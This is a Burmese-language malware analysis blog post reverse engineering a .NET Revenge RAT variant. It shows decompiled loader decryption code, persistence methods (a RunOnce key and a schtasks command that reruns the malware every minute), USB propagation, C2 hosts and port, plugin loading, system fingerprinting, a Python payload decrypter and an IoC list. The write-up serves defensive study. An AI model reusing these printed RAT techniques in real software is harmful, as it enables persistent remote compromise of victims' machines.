---
title: "Inside the Nuclear Explosion RAT: A Deep .NET Malware Reverse Engineering Breakdown"
description: "Inside the Nuclear Explosion RAT: A Deep .NET Malware Reverse Engineering Breakdown"
summary: "Inside the Nuclear Explosion RAT: A Deep .NET Malware Reverse Engineering Breakdown"
categories: ["Writeup"]
tags: ["Malware"]
#externalUrl: ""
date: 2026-02-20
draft: false
authors:
  - blitzkrieg
cover: /images/reverse_kr/rat.png
---

# Inside the Nuclear Explosion RAT: A Deep .NET Malware Reverse Engineering Breakdown

## 1. Introduction

ခု malware က .NET framework နဲ့ရေးထားတဲ့ sysmon.exe အမည်ရတဲ့ file ကို analysis လုပ်ထားခြင်း ဖြစ်ပါသည်။ ဒီ malware က Revenge RAT Family Remote Access Trojan (RAT) အမျိုးအစားဖြစ်ပြီးတော့ USB drive ကနေတစ်ဆင့် ပျံ့နှံ့ခြင်း၊ system မှာ persistence ဖြစ်အောင်လုပ်ခြင်း၊ module အသစ်များ ထည့်သွင်းနိုင်ခြင်း (plugin system) စတဲ့ လုပ်ဆောင်ချက်များ ပါဝင်ပါတယ်။
```
Sample file info -

original filename : sysmon.exe / usbdriver.exe
MD5: fb48154d350a19615554c6058959b5ea
second_stage filename : Nuclear Explosion

compile time : 2017-05-23 01:39:32 UTC
```

## 2. Deobfuscation and Decryption 

ပထမဆုံး အနေနဲ့ sysmon.exe ကို Detect it Easy ဆိုတဲ့ tool နဲ့ ဖွင့်ကြည့်လိုက်ပါမယ်။ 
![image](https://hackmd.io/_uploads/SJcyUOwuZl.png)

ကြည့်လိုက်တော့ .net နဲ့ ရေးထားတာ ဖြစ်တဲ့အတွက် disassembler ကို dnspy ဆိုတဲ့ tool ကို သုံးဘီး ကြည့်ကြည့်ပါမယ်။

```
using System;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Revenge_Hallaj_Method
{
	// Token: 0x02000009 RID: 9
	internal class φφωωωωψδδ
	{
		// Token: 0x06000013 RID: 19 RVA: 0x000021F8 File Offset: 0x000003F8
		public static void διξφββββββββββββββββββββββββββββββιξδ()
		{
			string text = "Fh7WztYrsjvASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0zFAOmIgUhJ9cBgjJCIVYSPXA4YiASFm0z[...string is too long...]";
			object obj = ιξιξφιξιξιξφιξιξφιιξιξφιξιξφιιξιξφιξιξφιιξφι.ωωωωψδωωψδωωψδωωψδψδ(ref text);
			text = obj.ToString();
			string text2 = Conversions.ToString(ιξιξφιξιξιξφιξιξφιιξιξφιξιξφιιξιξφιξιξφιιξφι.σσσσσσςδσσσςδσσσςδσσσςδςδ(ref text));
			byte[] bytes = Encoding.Default.GetBytes(text2.ToString());
			byte[] array = ιξιξφιξιξιξφιξιξφιιξιξφιξιξφιιξιξφιξιξφιιξφι.ιξφιξιξφιξιξφιξιξφιξ(bytes, "gggggffeessaaaqqq554", CipherMode.ECB, PaddingMode.PKCS7);
			ιξιξφιξιξιξφιξιξφιιξιξφιξιξφιιξιξφιξιξφιιξφι.κκκκμνβγ(ref array);
		}
	}
```
dnspy နဲ့ ဖွင့်လိုက်တော့ name တွေကို obfuscation အနည်းငယ်လုပ်ထားတာကို တွေ့ရပါတယ်။ ပထမဆုံးအနေနဲ့ main payload ကို text ဆိုတဲ့ variable ကို သိမ်းထားပီး `ιξιξφιξιξιξφιξιξφιιξιξφιξιξφιιξιξφιξιξφιιξφι.ωωωωψδωωψδωωψδωωψδψδ` ဆိုတဲ့ function ကိုခေါ်ထားတာကို တွေ့ရပါတယ်။ အာ့တော့ ဒီ function က ဘာလုပ်တာလဲ တစ်ချက်ကြည့်ကြည့်ပါမယ်။ 
```
public static object σσσσσσςδσσσςδσσσςδσσσςδςδ(ref string ξξξξβξξβξξβξξβξξβξξββ)
		{
			byte[] bytes = Convert.FromBase64String(ξξξξβξξβξξβξξβξξβξξββ);
			return Encoding.Default.GetString(bytes);
		}
public static string ωωωωψδωωψδωωψδωωψδψδ(ref string ςςσςςσσδςςσσδςςσσδςςσσδσδ)
		{
			char[] array = ςςσςςσσδςςσσδςςσσδςςσσδσδ.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}
```
ကြည့်လိုက်တော့`ςςσςςσσδςςσσδςςσσδςςσσδσδ` ဆိုတဲ့ function ကိုခေါ်ဘီး base64 decode လုပ်ပီးတော့ reverse strings လုပ်ထားတာပါ။ ဆိုတော့ ဒါဘီးရင် ဘာလုပ်လဲထပ်ကြည့်ကြည့်ပါမယ်။ Encoding.Default.GetBytes ဆိုတဲ့ function ကို သုံးပီး bytes array ကို ပြောင်းထားတာပါ။ အာတာပီးရင်တော့ `ιξφιξιξφιξιξφιξιξφιξ` ဆိုတဲ့ function ကို **gggggffeessaaaqqq554** ဆိုတဲ့ parameter နဲ့ ခေါ်ထားတာပါ။ အာ့တော့ အာ function က ဘာလူပ်တာလဲ ထပ်ကြည့်ကြည့်ပါမယ်။

```
public static byte[] ιξφιξιξφιξιξφιξιξφιξ(byte[] ιξιξφιξιξιξιξφιξιξ, string ξιξιξφιξξιξιξφιξξιξιξφιξ, CipherMode ξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξ = CipherMode.ECB, PaddingMode ιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξ = PaddingMode.PKCS7)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(ξιξιξφιξξιξιξφιξξιξιξφιξ));
			md5CryptoServiceProvider.Clear();
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = key;
			tripleDESCryptoServiceProvider.Mode = ξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξ;
			tripleDESCryptoServiceProvider.Padding = ιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξιξφιξξιξ;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] result = cryptoTransform.TransformFinalBlock(ιξιξφιξιξιξιξφιξιξ, 0, ιξιξφιξιξιξιξφιξιξ.Length);
			tripleDESCryptoServiceProvider.Clear();
			return result;
		}
```
ဒီ function ကို ဖတ်ကြည့်လိုက်တော့ TripleDES မှာ Key အဖြစ် "gggggffeessaaaqqq554" ကို MD5 hash လုပ်ပြီး (16 bytes) ECB mode, PKCS7 padding လုပ်ပီး decrypt လုပ်ထားတာကိုတွေ့ရပါတယ်။ အာ့တာပြီးရင်တော့ `κκκκμνβγ` ဆိုတဲ့ function ကိုခေါ်ဘီး payload execute လုပ်ထားတာပါ။

အကုန်ချုပ်ရရင် ပထမအဆင့် loader (HallajPriv) မှာ base64 string ကြီးတစ်ခုအနေဖြင့် သိမ်းဆည်းထားပြီး run တဲ့အချိန်မှာ execute လုပ်တာဖြစ်တဲ့အတွက် ကျွန်တော်ကတော့ ဒီ writeup မှာ static analysis နဲ့ဘဲ second stage payload ကိုရအောင်လုပ်ထားပါတယ်။ လုပ်ရတဲ့ အဆင့်တွေကတော့ 

*  reverse base64 string
*  base64 to bytes array 
*  Decrypt TripleDES

တို့ဘဲဖြစ်ပါတယ်။ ကျွန်တော်ကတော့ python နဲ့ decrypter ပြန်ရေးပီးဘီး decrypted.bin ဆိုတဲ့ main payload ကို decrypt လုပ်ထားပါတယ်။
```
#!/usr/bin/env python3
import base64
import hashlib
import sys
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad


# ----------------- Paste your full long string here (exactly as in the .NET source) -----------------
LONG_STRING = "placeholder encrypted payload"
# ----------------------------------------------------------------------------------------------------

KEY_TEXT = "gggggffeessaaaqqq554"   
ENCODING = "latin-1"                
OUTFILE = "decrypted.bin"

def derive_3des_key_from_md5(key_text: str):
    md5 = hashlib.md5(key_text.encode('utf-8')).digest()  # 16 bytes
    # Try 16-byte key with parity adjusted
    try:
        key16 = DES3.adjust_key_parity(md5)
        DES3.new(key16, DES3.MODE_ECB)  # validate
        return key16
    except Exception:
        # fallback: extend to 24 bytes (md5 + first 8 bytes)
        key24 = md5 + md5[:8]
        key24 = DES3.adjust_key_parity(key24)
        DES3.new(key24, DES3.MODE_ECB)  # validate
        return key24

def decrypt_triple_des_ecb_pkcs7(data_bytes: bytes, key_text: str):
    key = derive_3des_key_from_md5(key_text)
    cipher = DES3.new(key, DES3.MODE_ECB)
    decrypted = cipher.decrypt(data_bytes)
    try:
        return unpad(decrypted, DES3.block_size, style='pkcs7')
    except ValueError:
        # if unpad fails, return raw decrypted bytes
        return decrypted

def main():
    raw = LONG_STRING.strip()
    reversed_s = raw[::-1]
    try:
        b64_decoded = base64.b64decode(reversed_s)
    except Exception as e:
        print("Base64 decode failed:", e, file=sys.stderr)
        sys.exit(3)
    try:
        intermediate_str = b64_decoded.decode(ENCODING, errors='strict')
        bytes_for_decrypt = intermediate_str.encode(ENCODING)
    except Exception:
        bytes_for_decrypt = b64_decoded
    decrypted = decrypt_triple_des_ecb_pkcs7(bytes_for_decrypt, KEY_TEXT)
    with open(OUTFILE, "wb") as fo:
        fo.write(decrypted)
    print(f"Decryption finished — wrote {len(decrypted)} bytes to '{OUTFILE}'.")
    try:
        text_preview = decrypted[:1024].decode('utf-8')
        print("Preview (utf-8):")
        print(text_preview)
    except Exception:
        print("Preview (hex, first 80 bytes):", decrypted[:80].hex())

if __name__ == "__main__":
    main()
```
run လိုက်တော့ decrypted.bin ဆိုတဲ့ second stage payload ကို ရပါတယ်။
![image](https://hackmd.io/_uploads/SJDi3_PO-x.png)


## 3. Main Functionality
decrypted.bin ကလည်း .NET နဲ့ဘဲ ရေးထားတာဖြစ်တဲ့အတွက် dnspy ဆိုတဲ့ tool နဲ့ဘဲ ထပ်ဖွင့်ကြည့်ပါမယ်။
အဓိက main function ကတော့ 
**Nuclear_Explosion.Atomic** 
ဆိုတဲ့ဟာဘဲဖြစ်ပါတယ်။


### 3.1 Entry Point (Main)


```
vb
[STAThread]
public static void Main()
{
    if (!File.Exists(Path.GetTempPath() + "ZMpzZJH.txt"))
    {
        if (Atomic.App.Contains("SystemMonitor\\usbdriver.exe"))
            File.WriteAllText(Path.GetTempPath() + "ZMpzZJH.txt", "True");
    }
    Atomic.SCG.Execute();
}
```
malware က repeated attempt တွေမဖြစ်အောင်လို့ ZMpzZJH.txt ဆိုတဲ့  marker file ကို check ပီး မရှိပါက temp folder ထဲမှာသွားပီး create လုပ်ပါတယ်။
အာ့တာပီးတော့ Atomic.SCG.Execute() ဆိုတဲ့ function ကို run ပီး malicious action တွေစပါတယ်။

## 3.2 Thread Architecture

| Thread | Method | Purpose                     |
|--------|--------|----------------------------|
| SC     | MAC    | Socket communication       |
| PT     | Pin    | Counter / monitoring       |
| INST   | INS    | Persistence setup          |
| GP     | Spread | USB propagation            |



## 4. Persistence Mechanisms (INS Method)
Persistence method ဆိုတာကတော့ reboot ချပြီးတိုင်း malware ပြန်လည်အလုပ်လုပ်နိုင်ရန် နည်းလမ်းမျိုးစုံ ထည့်သွင်းထားတာဘဲဖြစ်ပါတယ်။

### 4.1 Mutex Protection
```
Atomic.MT = new Mutex(true, this.MUTEX, ref this.OW);
if (!this.OW) ProjectData.EndApp();
```
Mutex အမည်မှာ RV_MUTEX-DgBdtjWSTUKIWw ဖြစ်ပြီးတော့ mutex ဆိုတာကတော့ thread တွေကို limit တဲ့ kernel-level synchronization primitive ဖြစ်ပီးတော့ ဒီမှာကတော့ malware တွေ နှစ်ခါထပ်ပီး run မှာကို protection လုပ်ပေးပါတယ်။

### 4.2 Self-Copying

ဒီ malware ရဲ့ နောက်ထပ် function တစ်ခုကတော့ 
မိမိကိုယ်ကို %APPDATA%\sysmon.exe နဲ့ %STARTUP%\sysmon.exe သို့ ကူးပြီး run တာဖြစ်ပါတယ်။

Startup folder မှာလည်း scripts တွေ create လုပ်ပါသေးတယ် 
* System Monitor.vbs
* System Monitor.js
* System Monitor.lnk
* System Monitor.URL

### 4.3 Registry Persistence
```
this.IR("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "sysmon", Atomic.App);
```
RunOnce registry key အောက်မှာလည်းထည့်ပါသေးသည်။

### 4.4 Scheduled Task
```
Interaction.Shell("schtasks /create /sc minute /mo 1 /tn \"System Monitor\" /tr \"" + Atomic.App + "\"");
```
မိနစ်တိုင်း malware ပြန်လည် run စေဖို့ schedule task တစ်ခုလည်း create ပါသေးတယ်။

### 4.5 Additional Techniques

**Complex_Method** – Taskbar နှင့် Desktop shortcuts တွေကို ရှာပြီး malware ရဲ့  hidden copy ကို run သော malicious shortcut များနဲ့လည်း အစားထိုးပါသေးတယ်။

**RGPR** – RunOnce registry key ကို စောင့်ကြည့်ပြီးတော့ ပျက်သွားရင် ပြန်ထည့်ဖို့လည်း ‌ေရးထားပါသေးတယ်။

## 5. USB Propagation (Spread & INFALL)

 ၂၅ စက္ကန့်တစ်ကြိမ် drive အားလုံးကို စစ်ဆေးပြီးတော့ removable drive (သို့မဟုတ် fixed drive) တွေမှာ INFALL method(infection via autorun.inf) ကို သုံးပီး thread spread ဖို့လည်း လုပ်ပါသေးတယ်။

### 5.1 Hidden Folder Creation
```
Directory.CreateDirectory(Path + "SystemMonitor");
File.SetAttributes(..., FileAttributes.Hidden | FileAttributes.System);
File.Copy(Atomic.App, Path + "SystemMonitor\\usbdriver.exe");
```
SystemMonitor အမည်ရှိ hidden system folder ဖန်တီးပြီးတော့ malware ကိုဘဲ usbdriver.exe ဆိုတဲ့ နာမည်ပြောင်းပီးတော့ သိမ်းထားပါသေးတယ်။

### 5.2 Infection of Existing Files
```
CompilerParameters compilerParameters = new CompilerParameters();
compilerParameters.CompilerOptions = "/target:winexe" + (iconOption);
compilerParameters.OutputAssembly = Output;
CompilerResults results = new VBCodeProvider().CreateCompiler()
```
.lnk မဟုတ်တဲ့ file တွေကို SystemMonitor အတွင်းကိုရွှေ့ပြီး malware ကို run မယ့် stub exe များကိုလည်း ဖန်တီးပါသေးတယ်။

folder များကိုလည်း အလားတူရွှေ့ပြီးတော့ shortcut တွေလုပ်ပီး Stub ဖန်တီးဖို့အတွက် VBCodeProvider ကိုသုံးပြီးတော့ မူရင်း file ၏ icon ကိုထုတ်ပီး မူရင်းနဲ့တူအောင်လုပ်ပါသေးတယ်။


### 5.3 Self-Infection Prevention
.exe file ရဲ့ CompanyName ကိုစစ်ပြီးတော့ "JecwCkjosn" ဖြစ်ရင် infect မလုပ်ဘဲ skip အောင်လည်း ‌ေရးထားပါသေးတယ်။ malware ကို overwrite infect မဖြစ်အောင် လုပ်ထားတာဖြစ်ပါတယ်။

## 6. Command and Control (C2) Communication

c2 thread ကတော့ tcp ကိုဘဲ အသုံးပြုထားပါတယ်။

### 6.1 C2 Configuration
```
Hosts = Strings.Split("solos.dynu.net,www.quad.linkpc.net,", ",", ...);
Ports = Strings.Split("3333,3333,", ",", ...);
```
Domain နှစ်ခုစလုံးကတော့ port 3333 ကိုဘဲသုံးထားပါတယ်။

### 6.2 Communication Protocol
Message များကို *-]NK[-* delimiter ဖြင့်ခွဲပါတယ်။

Key Revenge-RAT ကို command နှင့် arguments ခွဲရန်သုံးတယ်။

ပို့တဲ့ data အားလုံးကို Base64 နဲ့ encode လုပ်ပါတယ်။

### 6.4 Supported Commands

| Command | Function                                  |
|---------|--------------------------------------------|
| PNC     | Ping response                              |
| P       | Send active window title                   |
| IE      | Load plugin from registry                  |
| LP      | Execute plugin with parameters             |
| UNV     | Download compressed plugin and execute     |


### 7. Plugin System
```
object instance = Assembly.Load(this.Decompress(Convert.FromBase64String(array[1])))
    .CreateInstance(array[2]);
NewLateBinding.LateCall(instance, null, "UNI", new object[] { ... 43 arguments ... }, ...);
```
Plugin တွေကတော့ .NET assembly တွေဖြစ်ပီးတော့ UNI အမည်ရှိတဲ့ method (parameter ၄၃ ခုပါ) ကို ခေါ်ယူအသုံးပြုပါတယ်။

### 7.1 Decompression
```
GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress);
```
ဒါပြီးတော့ Assembly.Load ဖြင့် load ကာ CreateInstance ဖြင့် object ဆောက်ပြီးတော့ UNI ကို late binding ဖြင့်ခေါ်ပြီး run ပါတယ်။

### 7.2 Registry Storage
```
Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + this.Encode(this.MUTEX) + "\\" + MD5, MD5, Bytes);
```
HKEY_CURRENT_USER\SOFTWARE\<base64_encoded_mutex>\<MD5> key အောက်မှာ compressed plugin bytes ကို string အဖြစ်သိမ်းထားပါတယ်။

## 8. System Fingerprinting
C2 သို့ ချိတ်ဆက်ပြီးနောက် အောက်ပါအချက်အလက်များပါသော beacon ကိုပို့ပါတယ်။

### 8.1 Hardware ID (HWD)
```
[DllImport("kernel32")]
private static extern int GVI(ref string IP, ref string V, int T, ref int H, ref int Q, ref int G, ref string J, int X);

public string HWD()
{
    string drive = Interaction.Environ("SystemDrive") + "\\";
    string fs = null;
    int serial = 0;
    Atomic.GVI(ref drive, ref fs, 0, ref serial, ref maxComp, ref flags, ref fs, 0);
    return Conversion.Hex(serial);
}
```
GetVolumeInformationA ဖြင့် system drive ၏ serial number ကိုရယူပြီး hexadecimal ပြောင်းလိုက်ပီး c2 ကိုပို့ပါတယ်။

### 8.2 OS and Architecture
```
ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_Processor");
foreach (ManagementObject mo in mos.Get())
    return mo["AddressWidth"].ToString();
8.3 Antivirus & Firewall Detection
vb
string root = "root\\SecurityCenter" + (Atomic.DI.OSFullName.Contains("XP") ? "" : "2");
foreach (ManagementObject mo in new ManagementObjectSearcher(root, Product).Get())
    text += mo["displayName"].ToString();
return Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
```
OS full name – ComputerInfo.OSFullName

Architecture – WMI Win32_Processor မှ AddressWidth

### 8.3 Security Software Enumeration
WMI namespace root\SecurityCenter (သို့ SecurityCenter2) မှ displayName ကိုရယူပီး c2 ကို ပို့ပါတယ်။

### 8.4 Camera Detection
```
[DllImport("avicap32.dll")]
public static extern bool capGetDriverDescriptionA(short wDriver, ref string lpszName, int cbName, ref string lpszVer, int cbVer);

public string CIVC()
{
    for (int i = 0; i <= 4; i++)
    {
        string name = Strings.Space(100);
        string ver = null;
        if (Atomic.capGetDriverDescriptionA((short)i, ref name, 100, ref ver, 100))
            return "Yes";
    }
    return "No";
}
```
capGetDriverDescriptionA ဖြင့် video capture driver ကိုစစ်ကာ Yes/No ပို့ပါတယ်။

### 8.5 Active Window Title
```
[DllImport("user32")]
private static extern IntPtr GFW();
[DllImport("user32")]
private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

public string GAW()
{
    StringBuilder sb = new StringBuilder(256);
    GetWindowText(GFW(), sb, sb.Capacity);
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(sb.ToString()));
}

```
GetForegroundWindow နှင့် GetWindowText ဖြင့် ရယူပြီး Base64 encode လုပ်ပြီးတော့ c2 ကိုပို့ပါတယ်။

## 9. Anti-Analysis Techniques
### 9.1 Memory Scrubbing
```
vb
[DllImport("psapi")]
public static extern bool EmptyWorkingSet(long hProcess);

// use in main loop
Atomic.EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
```
EmptyWorkingSet ကိုခေါ်ကာ process ၏ working set ကိုရှင်းလင်းပါတယ်။

### 9.2 Error Suppression
```
try
{
    // malicious code
}
catch (Exception ex)
{
    // silently ignore
}

```
လုပ်ဆောင်ချက်တိုင်းကို Try...Catch ဖြင့်ရစ်ထားပြီး error မပေါ်အောင်ပြုလုပ်ထားပါတယ်။



## 10. Indicators of Compromise (IoC များ)
```
%APPDATA%\sysmon.exe

%STARTUP%\sysmon.exe

%TEMP%\sysmon.exe

%SystemDrive%\ProgramData\SystemMonitor\

X:\SystemMonitor\usbdriver.exe

%STARTUP%\System Monitor.vbs (နှင့် အခြား scripts)

%TEMP%\ZMpzZJH.txt

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce : sysmon

HKCU\SOFTWARE\<base64>\*

Domains: solos.dynu.net, www.quad.linkpc.net

Port: 3333

Delimiter: *-]NK[-*

Key: Revenge-RAT

RV_MUTEX-DgBdtjWSTUKIWw
```


